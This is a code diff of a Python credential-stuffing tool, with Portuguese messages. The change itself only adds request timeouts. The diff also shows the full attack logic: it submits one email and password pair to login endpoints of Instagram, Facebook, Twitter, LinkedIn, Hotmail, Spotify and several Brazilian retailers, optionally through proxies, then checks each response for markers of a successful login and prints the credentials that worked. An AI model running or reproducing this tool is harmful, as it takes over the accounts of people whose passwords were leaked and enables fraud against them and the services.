@@ -75,7 +75,7 @@ if(esc == "1"):
     "X-CSRFToken": "666",
     "Content-Type": "application/x-www-form-urlencoded"
     }
-        inreq = requisicao.post(url='https://www.instagram.com/accounts/login/ajax/',data='username={}&password={}&queryParams=%7B%22source%22%3A%22auth_switcher%22%7D&optIntoOneTap=false'.format(email,senha),headers=instaheaders,proxies=proxies)
+        inreq = requisicao.post(url='https://www.instagram.com/accounts/login/ajax/',data='username={}&password={}&queryParams=%7B%22source%22%3A%22auth_switcher%22%7D&optIntoOneTap=false'.format(email,senha),headers=instaheaders,proxies=proxies,timeout=30)
         c = inreq.content
         c = str(c)
         if('userId' in c) or ('checkpoint_required' in c):
@@ -89,7 +89,7 @@ if(esc == "1"):
         fbheaders = {
         'Content-Type': 'application/x-www-form-urlencoded'
         }
-        fbreq = requisicao.post(url='https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data='jazoest=2588&lsd=1&display=&enable_profile_selector=&isprivate=&legacy_return=0&profile_selector_ids=&return_session=&skip_api_login=&signed_next=&trynum=1&timezone=180&lgndim=1&lgnrnd=1&lgnjs=1&email={}&pass={}&prefill_contact_point=1&prefill_source=1&prefill_type=contact_point&first_prefill_source=browser_dropdown&first_prefill_type=contact_point&had_cp_prefilled=true&had_password_prefilled=false&ab_test_data=1'.format(email,senha), cookies={'fr':'3'},headers=fbheaders,proxies=proxies)
+        fbreq = requisicao.post(url='https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data='jazoest=2588&lsd=1&display=&enable_profile_selector=&isprivate=&legacy_return=0&profile_selector_ids=&return_session=&skip_api_login=&signed_next=&trynum=1&timezone=180&lgndim=1&lgnrnd=1&lgnjs=1&email={}&pass={}&prefill_contact_point=1&prefill_source=1&prefill_type=contact_point&first_prefill_source=browser_dropdown&first_prefill_type=contact_point&had_cp_prefilled=true&had_password_prefilled=false&ab_test_data=1'.format(email,senha), cookies={'fr':'3'},headers=fbheaders,proxies=proxies,timeout=30)
         e = str(fbreq.headers)
         if("checkpoint=" in e) or ('spin=' in e):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > FACEBOOK: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -102,7 +102,7 @@ if(esc == "1"):
         kaheaders = {
         'Referer': 'https://www.kabum.com.br/cgi-local/site/login/login.cgi'
         }
-        kabreq = requisicao.post(url='https://www.kabum.com.br/cgi-local/site/login/login.cgi',data='tmp_hash=&login={}&senha={}&login.x=44&login.y=8&funcao=login'.format(email,senha),headers=kaheaders,proxies=proxies)
+        kabreq = requisicao.post(url='https://www.kabum.com.br/cgi-local/site/login/login.cgi',data='tmp_hash=&login={}&senha={}&login.x=44&login.y=8&funcao=login'.format(email,senha),headers=kaheaders,proxies=proxies,timeout=30)
         reka = str(kabreq.content)
         if('cgi-local/site/principal/home.cgi' in reka):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > KABUM: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -118,7 +118,7 @@ if(esc == "1"):
         kanuiheaders = {
         'Content-Type': 'application/x-www-form-urlencoded'
         }
-        kanuireq = requisicao.post(url='https://secure.kanui.com.br/customer/account/login/',data='YII_CSRF_TOKEN=1&LoginForm%5Bemail%5D={}&LoginForm%5Bpassword%5D={}'.format(email,senha),cookies=kanuicookies,headers=kanuiheaders,proxies=proxies)
+        kanuireq = requisicao.post(url='https://secure.kanui.com.br/customer/account/login/',data='YII_CSRF_TOKEN=1&LoginForm%5Bemail%5D={}&LoginForm%5Bpassword%5D={}'.format(email,senha),cookies=kanuicookies,headers=kanuiheaders,proxies=proxies,timeout=30)
         kanuih = str(kanuireq.headers)
         if('customer_logged=1' in kanuih):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > KANUI: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -135,7 +135,7 @@ if(esc == "1"):
         'X-Requested-With': 'XMLHttpRequest',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
         }
-        sarareq = requisicao.post(url='https://www.saraiva.com.br/customer/account/loginPost/',data='login%5Busername%5D={}&login%5Bpassword%5D={}'.format(email,senha),headers=saraheaders,cookies=saracookies,proxies=proxies)
+        sarareq = requisicao.post(url='https://www.saraiva.com.br/customer/account/loginPost/',data='login%5Busername%5D={}&login%5Bpassword%5D={}'.format(email,senha),headers=saraheaders,cookies=saracookies,proxies=proxies,timeout=30)
         sararesp = str(sarareq.content)
         if('is_logged_in":true' in sararesp):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > SARAIVA: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -152,7 +152,7 @@ if(esc == "1"):
         twcookies = {
         '_twitter_sess': 'BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCBgq8ZxpAToMY3NyZl9p%250AZCIlYWQ2ZTRkMDk1NzQ3Zjc0Y2FjZGJhNjhlNWIyMDFlNDQ6B2lkIiVmYThj%250ANWU5MDhjYTU0ODg3MWI3YzEyYTdlNGVmMjQxZg%253D%253D--87992233d593347d11a5a7f7f4925dbe271ff2e9'
         }
-        twreq = requisicao.post(url='https://twitter.com/sessions',data='session%5Busername_or_email%5D={}&session%5Bpassword%5D={}&authenticity_token=0ae78f20aef60fe95e7129c683950111fe16da22'.format(email,senha),cookies=twcookies,headers=twheaders,proxies=proxies)
+        twreq = requisicao.post(url='https://twitter.com/sessions',data='session%5Busername_or_email%5D={}&session%5Bpassword%5D={}&authenticity_token=0ae78f20aef60fe95e7129c683950111fe16da22'.format(email,senha),cookies=twcookies,headers=twheaders,proxies=proxies,timeout=30)
         resp = str(twreq.content)
         if('not redirected soon, please <a href="/">use this link</a>' in resp):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > TWITTER: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -174,7 +174,7 @@ if(esc == "1"):
         'Content-Type': 'application/x-www-form-urlencoded',
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
         }
-        linkereq = requisicao.post(url='https://www.linkedin.com/uas/login-submit?loginSubmitSource=GUEST_HOME',data='session_key={}&session_password={}&isJsEnabled=true&loginCsrfParam={}&fp_data=default'.format(email,senha,paramcookie),cookies=linkecookies,headers=linkeheaders,proxies=proxies)
+        linkereq = requisicao.post(url='https://www.linkedin.com/uas/login-submit?loginSubmitSource=GUEST_HOME',data='session_key={}&session_password={}&isJsEnabled=true&loginCsrfParam={}&fp_data=default'.format(email,senha,paramcookie),cookies=linkecookies,headers=linkeheaders,proxies=proxies,timeout=30)
         respostalinke = str(linkereq.headers)
         if('sw.js' in respostalinke):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > LINKEDIN: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -209,7 +209,7 @@ if(esc == "1"):
         'Content-Type': 'application/x-www-form-urlencoded'
         }
 
-        htreq = requisicao.post(url='https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1553121603&rver=7.0.6730.0&wp=LBI&wreply=https:%2f%2fwww.msn.com%2fpt-br%2fhomepage%2fSecure%2fPassport%3fru%3dhttps%253a%252f%252fwww.msn.com%252fpt-br%252f%253focid%253dmailsignout%2526pfr%253d1',data='i13=0&login={0}&loginfmt={0}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={1}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DTYnp*u8N%21Hpc67IeVKvoOTDlmV%21n9QD38bZtAloQXky8LaSfUFUD2FRvdOlUoat7eHwqD3XO89KEmcsj7FInVDouJFWhDiMgd7Hd6rFnFlPafNXbxmPE3mCbQcCOMLbTTLZgthCnL1kQ00X2ZgHRLHazIRIE7aduo7HSL8Sfmg*Qm3w%211rjKRpyrAnoXA4UKGjZsOyTne9n3oz*WnuT3f4nCqEKVx2mrsR1WzFJJYWz2hDdcchjylrlrHzvxdfRlp0p7Nka6fCg21UkPhB1s7M%24&PPSX=Pass&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=&i18=&i19='.format(email,senha),cookies=htcookies,headers=htheaders,proxies=proxies)
+        htreq = requisicao.post(url='https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1553121603&rver=7.0.6730.0&wp=LBI&wreply=https:%2f%2fwww.msn.com%2fpt-br%2fhomepage%2fSecure%2fPassport%3fru%3dhttps%253a%252f%252fwww.msn.com%252fpt-br%252f%253focid%253dmailsignout%2526pfr%253d1',data='i13=0&login={0}&loginfmt={0}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={1}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DTYnp*u8N%21Hpc67IeVKvoOTDlmV%21n9QD38bZtAloQXky8LaSfUFUD2FRvdOlUoat7eHwqD3XO89KEmcsj7FInVDouJFWhDiMgd7Hd6rFnFlPafNXbxmPE3mCbQcCOMLbTTLZgthCnL1kQ00X2ZgHRLHazIRIE7aduo7HSL8Sfmg*Qm3w%211rjKRpyrAnoXA4UKGjZsOyTne9n3oz*WnuT3f4nCqEKVx2mrsR1WzFJJYWz2hDdcchjylrlrHzvxdfRlp0p7Nka6fCg21UkPhB1s7M%24&PPSX=Pass&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=&i18=&i19='.format(email,senha),cookies=htcookies,headers=htheaders,proxies=proxies,timeout=30)
         respht = str(htreq.headers)
         if('PPAuth' in respht):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > HOTMAIL: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -222,7 +222,7 @@ if(esc == "1"):
         walheaders = {
         'Content-Type': 'application/x-www-form-urlencoded'
         }
-        walreq = requisicao.post(url='https://connect.walmart.com.br/connect/LoginService',data='signinField={0}&password={1}&connected=true&continue=https%3A%2F%2Fconnect.walmart.com.br%2Fconnect%2Fauthorize%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%3A%2F%2Fapi-ws.walmart.com.br%2Fapi%2Fwebstore%2Fauth%2Fcallback%26client_id%3Dwalmart_webstore%26type%3D%26state%3Dredirect_to%3D&clientId=walmart_webstore&signinButtonSend=Entrar&X-Tmx-session-id=1&email={0}'.format(email,senha),headers=walheaders,proxies=proxies)
+        walreq = requisicao.post(url='https://connect.walmart.com.br/connect/LoginService',data='signinField={0}&password={1}&connected=true&continue=https%3A%2F%2Fconnect.walmart.com.br%2Fconnect%2Fauthorize%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%3A%2F%2Fapi-ws.walmart.com.br%2Fapi%2Fwebstore%2Fauth%2Fcallback%26client_id%3Dwalmart_webstore%26type%3D%26state%3Dredirect_to%3D&clientId=walmart_webstore&signinButtonSend=Entrar&X-Tmx-session-id=1&email={0}'.format(email,senha),headers=walheaders,proxies=proxies,timeout=30)
         respw = str(walreq.headers)
         if('logged-in=true' in respw):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > WALMART: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -232,7 +232,7 @@ if(esc == "1"):
             print(Fore.RED,"[-] O USUÁRIO NÃO USA A MESMA SENHA NA WALMART.",Style.RESET_ALL)
         tempo.sleep(2)
         print("\n- Testando na Spotify...")
-        pegacsrftokennovo = requisicao.get(url="https://accounts.spotify.com/",headers={ 'Content-Type': 'application/x-www-form-urlencoded' },proxies=proxies)
+        pegacsrftokennovo = requisicao.get(url="https://accounts.spotify.com/",headers={ 'Content-Type': 'application/x-www-form-urlencoded' },proxies=proxies,timeout=30)
         csrftoken = str(pegacsrftokennovo.headers)
         csrftoken = csrftoken[1973:2053]
         spotheaders = {
@@ -242,7 +242,7 @@ if(esc == "1"):
         'csrf_token': csrftoken,
         '__bon': 'MHwwfDIxNDUwMDg3Mjd8OTAwOTAzNjY1MzR8MXwxfDF8MQ=='
         }
-        sptreq = requisicao.post(url='https://accounts.spotify.com/api/login',data='remember=true&username={}&password={}&recaptchaToken&csrf_token={}'.format(email,senha,csrftoken),cookies=spotcookies,headers=spotheaders,proxies=proxies)
+        sptreq = requisicao.post(url='https://accounts.spotify.com/api/login',data='remember=true&username={}&password={}&recaptchaToken&csrf_token={}'.format(email,senha,csrftoken),cookies=spotcookies,headers=spotheaders,proxies=proxies,timeout=30)
         respspot = str(sptreq.content)
         if('displayName' in respspot):
         	print(Fore.YELLOW,Style.BRIGHT, "[+] CREDENTIAL STUFFING > SPOTIFY: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -265,7 +265,7 @@ elif(esc == "2"):
     "X-CSRFToken": "666",
     "Content-Type": "application/x-www-form-urlencoded"
     }
-        inreq = requisicao.post(url='https://www.instagram.com/accounts/login/ajax/',data='username={}&password={}&queryParams=%7B%22source%22%3A%22auth_switcher%22%7D&optIntoOneTap=false'.format(email,senha),headers=instaheaders)
+        inreq = requisicao.post(url='https://www.instagram.com/accounts/login/ajax/',data='username={}&password={}&queryParams=%7B%22source%22%3A%22auth_switcher%22%7D&optIntoOneTap=false'.format(email,senha),headers=instaheaders,timeout=30)
         c = inreq.content
         c = str(c)
         if('userId' in c) or ('checkpoint_required' in c):
@@ -279,7 +279,7 @@ elif(esc == "2"):
         fbheaders = {
         'Content-Type': 'application/x-www-form-urlencoded'
         }
-        fbreq = requisicao.post(url='https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data='jazoest=2588&lsd=1&display=&enable_profile_selector=&isprivate=&legacy_return=0&profile_selector_ids=&return_session=&skip_api_login=&signed_next=&trynum=1&timezone=180&lgndim=1&lgnrnd=1&lgnjs=1&email={}&pass={}&prefill_contact_point=1&prefill_source=1&prefill_type=contact_point&first_prefill_source=browser_dropdown&first_prefill_type=contact_point&had_cp_prefilled=true&had_password_prefilled=false&ab_test_data=1'.format(email,senha), cookies={'fr':'3'},headers=fbheaders)
+        fbreq = requisicao.post(url='https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data='jazoest=2588&lsd=1&display=&enable_profile_selector=&isprivate=&legacy_return=0&profile_selector_ids=&return_session=&skip_api_login=&signed_next=&trynum=1&timezone=180&lgndim=1&lgnrnd=1&lgnjs=1&email={}&pass={}&prefill_contact_point=1&prefill_source=1&prefill_type=contact_point&first_prefill_source=browser_dropdown&first_prefill_type=contact_point&had_cp_prefilled=true&had_password_prefilled=false&ab_test_data=1'.format(email,senha), cookies={'fr':'3'},headers=fbheaders,timeout=30)
         e = str(fbreq.headers)
         if("checkpoint=" in e) or ('spin=' in e):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > FACEBOOK: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -292,7 +292,7 @@ elif(esc == "2"):
         kaheaders = {
         'Referer': 'https://www.kabum.com.br/cgi-local/site/login/login.cgi'
         }
-        kabreq = requisicao.post(url='https://www.kabum.com.br/cgi-local/site/login/login.cgi',data='tmp_hash=&login={}&senha={}&login.x=44&login.y=8&funcao=login'.format(email,senha),headers=kaheaders)
+        kabreq = requisicao.post(url='https://www.kabum.com.br/cgi-local/site/login/login.cgi',data='tmp_hash=&login={}&senha={}&login.x=44&login.y=8&funcao=login'.format(email,senha),headers=kaheaders,timeout=30)
         reka = str(kabreq.content)
         if('cgi-local/site/principal/home.cgi' in reka):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > KABUM: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -308,7 +308,7 @@ elif(esc == "2"):
         kanuiheaders = {
         'Content-Type': 'application/x-www-form-urlencoded'
         }
-        kanuireq = requisicao.post(url='https://secure.kanui.com.br/customer/account/login/',data='YII_CSRF_TOKEN=1&LoginForm%5Bemail%5D={}&LoginForm%5Bpassword%5D={}'.format(email,senha),cookies=kanuicookies,headers=kanuiheaders)
+        kanuireq = requisicao.post(url='https://secure.kanui.com.br/customer/account/login/',data='YII_CSRF_TOKEN=1&LoginForm%5Bemail%5D={}&LoginForm%5Bpassword%5D={}'.format(email,senha),cookies=kanuicookies,headers=kanuiheaders,timeout=30)
         kanuih = str(kanuireq.headers)
         if('customer_logged=1' in kanuih):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > KANUI: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -325,7 +325,7 @@ elif(esc == "2"):
         'X-Requested-With': 'XMLHttpRequest',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
         }
-        sarareq = requisicao.post(url='https://www.saraiva.com.br/customer/account/loginPost/',data='login%5Busername%5D={}&login%5Bpassword%5D={}'.format(email,senha),headers=saraheaders,cookies=saracookies)
+        sarareq = requisicao.post(url='https://www.saraiva.com.br/customer/account/loginPost/',data='login%5Busername%5D={}&login%5Bpassword%5D={}'.format(email,senha),headers=saraheaders,cookies=saracookies,timeout=30)
         sararesp = str(sarareq.content)
         if('is_logged_in":true' in sararesp):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > SARAIVA: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -342,7 +342,7 @@ elif(esc == "2"):
         twcookies = {
         '_twitter_sess': 'BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCBgq8ZxpAToMY3NyZl9p%250AZCIlYWQ2ZTRkMDk1NzQ3Zjc0Y2FjZGJhNjhlNWIyMDFlNDQ6B2lkIiVmYThj%250ANWU5MDhjYTU0ODg3MWI3YzEyYTdlNGVmMjQxZg%253D%253D--87992233d593347d11a5a7f7f4925dbe271ff2e9'
         }
-        twreq = requisicao.post(url='https://twitter.com/sessions',data='session%5Busername_or_email%5D={}&session%5Bpassword%5D={}&authenticity_token=0ae78f20aef60fe95e7129c683950111fe16da22'.format(email,senha),cookies=twcookies,headers=twheaders)
+        twreq = requisicao.post(url='https://twitter.com/sessions',data='session%5Busername_or_email%5D={}&session%5Bpassword%5D={}&authenticity_token=0ae78f20aef60fe95e7129c683950111fe16da22'.format(email,senha),cookies=twcookies,headers=twheaders,timeout=30)
         resp = str(twreq.content)
         if('not redirected soon, please <a href="/">use this link</a>' in resp):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > TWITTER: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -364,7 +364,7 @@ elif(esc == "2"):
         'Content-Type': 'application/x-www-form-urlencoded',
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
         }
-        linkereq = requisicao.post(url='https://www.linkedin.com/uas/login-submit?loginSubmitSource=GUEST_HOME',data='session_key={}&session_password={}&isJsEnabled=true&loginCsrfParam={}&fp_data=default'.format(email,senha,paramcookie),cookies=linkecookies,headers=linkeheaders)
+        linkereq = requisicao.post(url='https://www.linkedin.com/uas/login-submit?loginSubmitSource=GUEST_HOME',data='session_key={}&session_password={}&isJsEnabled=true&loginCsrfParam={}&fp_data=default'.format(email,senha,paramcookie),cookies=linkecookies,headers=linkeheaders,timeout=30)
         respostalinke = str(linkereq.headers)
         if('sw.js' in respostalinke):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > LINKEDIN: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -399,7 +399,7 @@ elif(esc == "2"):
         'Content-Type': 'application/x-www-form-urlencoded'
         }
 
-        htreq = requisicao.post(url='https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1553121603&rver=7.0.6730.0&wp=LBI&wreply=https:%2f%2fwww.msn.com%2fpt-br%2fhomepage%2fSecure%2fPassport%3fru%3dhttps%253a%252f%252fwww.msn.com%252fpt-br%252f%253focid%253dmailsignout%2526pfr%253d1',data='i13=0&login={0}&loginfmt={0}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={1}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DTYnp*u8N%21Hpc67IeVKvoOTDlmV%21n9QD38bZtAloQXky8LaSfUFUD2FRvdOlUoat7eHwqD3XO89KEmcsj7FInVDouJFWhDiMgd7Hd6rFnFlPafNXbxmPE3mCbQcCOMLbTTLZgthCnL1kQ00X2ZgHRLHazIRIE7aduo7HSL8Sfmg*Qm3w%211rjKRpyrAnoXA4UKGjZsOyTne9n3oz*WnuT3f4nCqEKVx2mrsR1WzFJJYWz2hDdcchjylrlrHzvxdfRlp0p7Nka6fCg21UkPhB1s7M%24&PPSX=Pass&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=&i18=&i19='.format(email,senha),cookies=htcookies,headers=htheaders)
+        htreq = requisicao.post(url='https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1553121603&rver=7.0.6730.0&wp=LBI&wreply=https:%2f%2fwww.msn.com%2fpt-br%2fhomepage%2fSecure%2fPassport%3fru%3dhttps%253a%252f%252fwww.msn.com%252fpt-br%252f%253focid%253dmailsignout%2526pfr%253d1',data='i13=0&login={0}&loginfmt={0}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={1}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DTYnp*u8N%21Hpc67IeVKvoOTDlmV%21n9QD38bZtAloQXky8LaSfUFUD2FRvdOlUoat7eHwqD3XO89KEmcsj7FInVDouJFWhDiMgd7Hd6rFnFlPafNXbxmPE3mCbQcCOMLbTTLZgthCnL1kQ00X2ZgHRLHazIRIE7aduo7HSL8Sfmg*Qm3w%211rjKRpyrAnoXA4UKGjZsOyTne9n3oz*WnuT3f4nCqEKVx2mrsR1WzFJJYWz2hDdcchjylrlrHzvxdfRlp0p7Nka6fCg21UkPhB1s7M%24&PPSX=Pass&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=&i18=&i19='.format(email,senha),cookies=htcookies,headers=htheaders,timeout=30)
         respht = str(htreq.headers)
         if('PPAuth' in respht):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > HOTMAIL: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -412,7 +412,7 @@ elif(esc == "2"):
         walheaders = {
         'Content-Type': 'application/x-www-form-urlencoded'
         }
-        walreq = requisicao.post(url='https://connect.walmart.com.br/connect/LoginService',data='signinField={0}&password={1}&connected=true&continue=https%3A%2F%2Fconnect.walmart.com.br%2Fconnect%2Fauthorize%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%3A%2F%2Fapi-ws.walmart.com.br%2Fapi%2Fwebstore%2Fauth%2Fcallback%26client_id%3Dwalmart_webstore%26type%3D%26state%3Dredirect_to%3D&clientId=walmart_webstore&signinButtonSend=Entrar&X-Tmx-session-id=1&email={0}'.format(email,senha),headers=walheaders)
+        walreq = requisicao.post(url='https://connect.walmart.com.br/connect/LoginService',data='signinField={0}&password={1}&connected=true&continue=https%3A%2F%2Fconnect.walmart.com.br%2Fconnect%2Fauthorize%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%3A%2F%2Fapi-ws.walmart.com.br%2Fapi%2Fwebstore%2Fauth%2Fcallback%26client_id%3Dwalmart_webstore%26type%3D%26state%3Dredirect_to%3D&clientId=walmart_webstore&signinButtonSend=Entrar&X-Tmx-session-id=1&email={0}'.format(email,senha),headers=walheaders,timeout=30)
         respw = str(walreq.headers)
         if('logged-in=true' in respw):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > WALMART: {}:{}".format(email,senha),Style.RESET_ALL)
@@ -432,7 +432,7 @@ elif(esc == "2"):
         'csrf_token': csrftoken,
         '__bon': 'MHwwfDIxNDUwMDg3Mjd8OTAwOTAzNjY1MzR8MXwxfDF8MQ=='
         }
-        sptreq = requisicao.post(url='https://accounts.spotify.com/api/login',data='remember=true&username={}&password={}&recaptchaToken&csrf_token={}'.format(email,senha,csrftoken),cookies=spotcookies,headers=spotheaders)
+        sptreq = requisicao.post(url='https://accounts.spotify.com/api/login',data='remember=true&username={}&password={}&recaptchaToken&csrf_token={}'.format(email,senha,csrftoken),cookies=spotcookies,headers=spotheaders,timeout=30)
         respspot = str(sptreq.content)
         if('displayName' in respspot):
         	print(Fore.YELLOW,Style.BRIGHT, "[+] CREDENTIAL STUFFING > SPOTIFY: {}:{}".format(email,senha),Style.RESET_ALL)
